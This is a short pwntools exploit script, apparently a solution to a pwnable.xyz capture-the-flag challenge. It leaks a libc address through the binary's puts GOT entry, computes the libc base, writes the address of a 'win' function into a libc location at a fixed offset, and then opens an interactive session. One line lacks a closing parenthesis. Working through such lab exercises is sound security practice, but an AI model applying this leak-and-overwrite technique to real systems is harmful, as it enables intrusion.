from pwn import *

r = process("./challenge")
#r = remote("svc.pwnable.xyz", 30019)
elf = ELF("./challenge")
libc = ELF("./alpine-libc-2.28.so"

r.sendlineafter(">", "1")
r.sendlineafter("Addr: ", str(elf.got["puts"]))
libcbase = u64(r.recvn(6) + "\x00\x00") - libc.symbols["puts"]
log.info("libc: 0x{:x}".format(libcbase))

print "fuck offset", hex(libcbase + 0x3B70A8)
#gdb.attach(r)
r.sendlineafter(">", "2")

r.sendlineafter("Addr: ", str(libcbase + 0x3B70A8))

r.sendlineafter("Value: ", str(elf.symbols["win"]))
r.sendlineafter(">", "1")
r.sendlineafter("Addr: ", "1")
r.interactive()
